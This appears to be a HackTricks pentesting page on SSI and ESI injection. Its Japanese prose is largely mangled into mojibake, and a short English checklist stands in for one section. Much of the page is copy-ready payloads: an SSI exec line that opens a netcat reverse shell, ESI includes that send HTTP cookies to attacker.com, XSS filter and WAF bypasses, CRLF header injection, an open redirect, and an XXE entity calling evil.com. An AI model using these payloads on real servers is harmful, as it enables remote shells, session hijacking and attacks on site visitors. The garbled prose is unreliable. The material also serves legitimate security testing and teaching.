# ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³/ã‚¨ãƒƒã‚¸ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ã®åŸºæœ¬æƒ…å ±

SSIï¼ˆã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ï¼‰ã¯ã€HTMLãƒšãƒ¼ã‚¸ã«é…ç½®ã•ã‚Œã€ãƒšãƒ¼ã‚¸ãŒæä¾›ã•ã‚Œã‚‹éš›ã«ã‚µãƒ¼ãƒãƒ¼ã§è©•ä¾¡ã•ã‚Œã‚‹æŒ‡ç¤ºã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€CGIãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚„ä»–ã®å‹•çš„ãªæŠ€è¡“ã‚’ä»‹ã—ã¦ãƒšãƒ¼ã‚¸å…¨ä½“ã‚’æä¾›ã™ã‚‹å¿…è¦ãªãã€æ—¢å­˜ã®HTMLãƒšãƒ¼ã‚¸ã«**å‹•çš„ã«ç”Ÿæˆã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãŸã¨ãˆã°ã€æ¬¡ã®ã‚ˆã†ã«æ—¢å­˜ã®HTMLãƒšãƒ¼ã‚¸ã«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’é…ç½®ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

`<!--#echo var="DATE_LOCAL" -->`

ãã—ã¦ã€ãƒšãƒ¼ã‚¸ãŒæä¾›ã•ã‚Œã‚‹ã¨ã€ã“ã®ãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã¯è©•ä¾¡ã•ã‚Œã€ãã®å€¤ã§ç½®ãæ›ãˆã‚‰ã‚Œã¾ã™ã€‚

`Tuesday, 15-Jan-2013 19:28:54 EST`

SSIã‚’ä½¿ç”¨ã™ã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã¨ã€ãƒšãƒ¼ã‚¸å…¨ä½“ã‚’ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ã‚ˆã£ã¦ç”Ÿæˆã™ã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã¯ã€é€šå¸¸ã€ãƒšãƒ¼ã‚¸ã®ã©ã‚Œã ã‘ãŒé™çš„ã§ã‚ã‚Šã€ãƒšãƒ¼ã‚¸ãŒæä¾›ã•ã‚Œã‚‹ãŸã³ã«å†è¨ˆç®—ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã«ã‚ˆã£ã¦æ±ºã¾ã‚Šã¾ã™ã€‚SSIã¯ã€ä¸Šè¨˜ã®ã‚ˆã†ã«ç¾åœ¨ã®æ™‚åˆ»ãªã©ã®å°ã•ãªæƒ…å ±ã‚’è¿½åŠ ã™ã‚‹ãŸã‚ã®ç´ æ™´ã‚‰ã—ã„æ–¹æ³•ã§ã™ã€‚ã—ã‹ã—ã€ãƒšãƒ¼ã‚¸ã®å¤§éƒ¨åˆ†ãŒæä¾›ã•ã‚Œã‚‹æ™‚ç‚¹ã§ç”Ÿæˆã•ã‚Œã‚‹å ´åˆã¯ã€ä»–ã®è§£æ±ºç­–ã‚’æ¢ã™å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ï¼ˆå®šç¾©ã¯[ã“ã“](https://httpd.apache.org/docs/current/howto/ssi.html)ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸï¼‰ã€‚

ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒæ‹¡å¼µå­`.shtml`ã€`.shtm`ã€ã¾ãŸã¯`.stm`ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€SSIã®å­˜åœ¨ã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ã“ã‚Œã«é™å®šã•ã‚Œã¾ã›ã‚“ã€‚

å…¸å‹çš„ãªSSIå¼ã®å½¢å¼ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```
<!--#directive param="value" -->
```
### ãƒã‚§ãƒƒã‚¯

To check for Server-Side Inclusion (SSI) and Edge-Side Inclusion (ESI) Injection vulnerabilities, you can follow these steps:

1. **Identify user-controllable input**: Look for any user input that is directly or indirectly used in the server-side code or templates. This can include parameters in URLs, form inputs, cookies, or HTTP headers.

2. **Inject SSI/ESI payloads**: Once you have identified the user-controllable input, inject SSI or ESI payloads to test for vulnerabilities. For SSI, you can use the `<!--#include virtual="file" -->` directive to include a file. For ESI, you can use the `<esi:include src="url" />` tag to include a URL.

3. **Observe the response**: Check if the injected payload is executed and if any server-side code or template files are included in the response. Look for any unexpected content or error messages that may indicate a successful inclusion.

4. **Exploit the vulnerability**: If the payload is successfully executed and includes server-side code or template files, try to exploit the vulnerability further. This can include accessing sensitive files, executing arbitrary code, or escalating privileges.

5. **Mitigate the vulnerability**: Once the vulnerability is confirmed, it is important to mitigate it to prevent potential attacks. This can involve sanitizing user input, implementing proper input validation, and using secure coding practices.

By following these steps, you can effectively check for SSI and ESI Injection vulnerabilities and take appropriate actions to secure your web application.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## ã‚¨ãƒƒã‚¸ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®ä¸€éƒ¨ãŒæ¬¡å›ã®å–å¾—æ™‚ã«å¤‰åŒ–ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€**æƒ…å ±ã®ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚„å‹•çš„ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã«å•é¡ŒãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚ŒãŒESIãŒä½¿ç”¨ã•ã‚Œã‚‹ç†ç”±ã§ã€ESIã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦**ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’é€ä¿¡ã™ã‚‹å‰ã«ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚‹å‹•çš„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„**ã‚’ç¤ºã—ã¾ã™ã€‚\
ã‚‚ã—**æ”»æ’ƒè€…**ãŒã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å†…ã«**ESIã‚¿ã‚°ã‚’æ³¨å…¥**ã§ãã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é€ä¿¡ã•ã‚Œã‚‹å‰ã«ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«**ä»»æ„ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æ³¨å…¥**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ESIã®æ¤œå‡º

ä»¥ä¸‹ã®**ãƒ˜ãƒƒãƒ€ãƒ¼**ãŒã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯ESIã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚
```
Surrogate-Control: content="ESI/1.0"
```
ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯**ESIã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚\
**ç›²ç›®çš„ãªæ”»æ’ƒæ‰‹æ³•ã‚‚ä½¿ç”¨ã§ãã¾ã™**ã€‚æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒåˆ°ç€ã™ã‚‹ã¯ãšã§ã™ã€‚
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESIã®æ‚ªç”¨

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)ã¯ã€ç•°ãªã‚‹ESIå¯¾å¿œã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã«å¯¾ã—ã¦è©¦ã™ã“ã¨ãŒã§ãã‚‹æ”»æ’ƒã®å¯èƒ½æ€§ã‚’ç†è§£ã™ã‚‹ãŸã‚ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã—ã¾ã—ãŸã€‚ä»¥ä¸‹ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã®åˆ—åã«é–¢ã—ã¦ã€ã„ãã¤ã‹ã®èª¬æ˜ã‚’æä¾›ã—ã¾ã™ï¼š

* **Includes**: `<esi:includes>`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™
* **Vars**: `<esi:vars>`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚XSSãƒ•ã‚£ãƒ«ã‚¿ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™
* **Cookie**: ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®ã‚¯ãƒƒã‚­ãƒ¼ã¯ESIã‚¨ãƒ³ã‚¸ãƒ³ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™
* **Upstream Headers Required**: ä¸Šæµã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ˜ãƒƒãƒ€ã‚’æä¾›ã—ãªã„é™ã‚Šã€ã‚µãƒ­ã‚²ãƒ¼ãƒˆã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ESIã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’å‡¦ç†ã—ã¾ã›ã‚“
* **Host Allowlist**: ã“ã®å ´åˆã€ESIã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã¯è¨±å¯ã•ã‚ŒãŸã‚µãƒ¼ãƒãƒ¼ãƒ›ã‚¹ãƒˆã‹ã‚‰ã®ã¿å¯èƒ½ã§ã‚ã‚Šã€ä¾‹ãˆã°SSRFã¯ãã‚Œã‚‰ã®ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦ã®ã¿å¯èƒ½ã§ã™

|         **ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Yes     |    Yes   |     Yes     |              Yes              |         No         |
|         Varnish Cache        |      Yes     |    No    |      No     |              Yes              |         Yes        |
|            Fastly            |      Yes     |    No    |      No     |               No              |         Yes        |
| Akamai ESI Test Server (ETS) |      Yes     |    Yes   |     Yes     |               No              |         No         |
|          NodeJS esi          |      Yes     |    Yes   |     Yes     |               No              |         No         |
|         NodeJS nodesi        |      Yes     |    No    |      No     |               No              |      Optional      |

#### XSS

ä»¥ä¸‹ã®ESIãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã«ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
```markup
<esi:include src=http://attacker.com/xss.html>
```
ãƒ•ã‚¡ã‚¤ãƒ«_http://attacker.com/xss.html_ã«ã¯ã€`<script>alert(1)</script>`ã®ã‚ˆã†ãªXSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

#### ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®XSSä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Cookieã®ç›—ã¿å‡ºã—

* ãƒªãƒ¢ãƒ¼ãƒˆã§Cookieã‚’ç›—ã¿å‡ºã™
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«åæ˜ ã•ã›ã‚‹ã“ã¨ã§ã€XSSã‚’ä½¿ç”¨ã—ã¦HTTP\_ONLYã‚¯ãƒƒã‚­ãƒ¼ã‚’ç›—ã‚€ï¼š
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
<figure><img src="../.gitbook/assets/image (4) (7).png" alt=""><figcaption></figcaption></figure>

* ã‚¯ãƒƒã‚­ãƒ¼ã®åæ˜ ã«ã‚ˆã‚‹å®Œå…¨ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆä¹—ã£å–ã‚Š

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãªãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«

ã“ã‚Œã¯ã€Œãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ã€ã¨ã¯æ··åŒã—ãªã„ã§ãã ã•ã„ã€‚
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLFï¼ˆCarriage Return Line Feedï¼‰ã¯ã€ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«å†…ã®æ”¹è¡Œã‚’è¡¨ã™ç‰¹æ®Šãªæ–‡å­—ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã§ã™ã€‚CRï¼ˆã‚­ãƒ£ãƒªãƒƒã‚¸ãƒªã‚¿ãƒ¼ãƒ³ï¼‰ã¯ã‚«ãƒ¼ã‚½ãƒ«ã‚’è¡Œã®å…ˆé ­ã«ç§»å‹•ã•ã›ã€LFï¼ˆãƒ©ã‚¤ãƒ³ãƒ•ã‚£ãƒ¼ãƒ‰ï¼‰ã¯ã‚«ãƒ¼ã‚½ãƒ«ã‚’æ¬¡ã®è¡Œã«ç§»å‹•ã•ã›ã¾ã™ã€‚

CRLFã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã„ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ãŒç›´æ¥ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã«æŒ¿å…¥ã•ã‚Œã‚‹å ´åˆã«ç™ºç”Ÿã™ã‚‹è„†å¼±æ€§ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€æ”¹è¡Œæ–‡å­—ã‚’ä½¿ç”¨ã—ã¦ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ”¹ã–ã‚“ã—ã€ä»»æ„ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚„ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

CRLFã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å½±éŸ¿ã¯ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼ˆXSSï¼‰ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰ãªã©ã€ã•ã¾ã–ã¾ãªæ”»æ’ƒã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

CRLFã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’é˜²ããŸã‚ã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹ã‹ã€æ”¹è¡Œæ–‡å­—ã‚’å‰Šé™¤ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã®é©åˆ‡ãªè¨­å®šã‚„ã€æœ€æ–°ã®ãƒ‘ãƒƒãƒã‚„ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã®é©ç”¨ã‚‚é‡è¦ã§ã™ã€‚
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ

ä»¥ä¸‹ã¯ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã« `Location` ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã—ã¾ã™ã€‚
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### ãƒ˜ãƒƒãƒ€ãƒ¼ã®è¿½åŠ 

* å¼·åˆ¶ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã™ã‚‹
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã—ã¾ã™ï¼ˆXSSã‚’å«ã‚€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã§ã€ŒContent-Type: text/jsonã€ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ï¼‰
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
<figure><img src="../.gitbook/assets/image (5) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

#### ãƒ˜ãƒƒãƒ€ãƒ¼ã«CRLFã‚’è¿½åŠ ã™ã‚‹ï¼ˆ**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai ãƒ‡ãƒãƒƒã‚°

ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å«ã¾ã‚Œã‚‹ãƒ‡ãƒãƒƒã‚°æƒ…å ±ãŒé€ä¿¡ã•ã‚Œã¾ã™ï¼š
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

`xslt`å€¤ã‚’_dca_ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€**eXtensible Stylesheet Language Transformations (XSLT)**ãƒ™ãƒ¼ã‚¹ã®ESIã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚æ¬¡ã®ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã¯ã€HTTPã‚µãƒ­ã‚²ãƒ¼ãƒˆã«XMLãƒ•ã‚¡ã‚¤ãƒ«ã¨XSLTãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã‚ã›ã¾ã™ã€‚ãã®å¾Œã€XSLTãƒ•ã‚¡ã‚¤ãƒ«ãŒXMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®XMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€**XML External Entity (XXE)**æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯**Server-Side Request Forgery (SSRF)**æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ESIã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰è‡ªä½“ãŒSSRFãƒ™ã‚¯ãƒˆãƒ«ã§ã‚ã‚‹ãŸã‚ã€ã‚ã¾ã‚Šæœ‰ç”¨ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚å¤–éƒ¨DTDã¯è§£æã•ã‚Œã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€åŸºç¤ã¨ãªã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªï¼ˆXalanï¼‰ãŒãã‚Œã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„ãŸã‚ã§ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLTãƒ•ã‚¡ã‚¤ãƒ«ï¼š
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
XSLTãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

### å‚è€ƒæ–‡çŒ®

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ¤œå‡ºãƒªã‚¹ãƒˆ

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

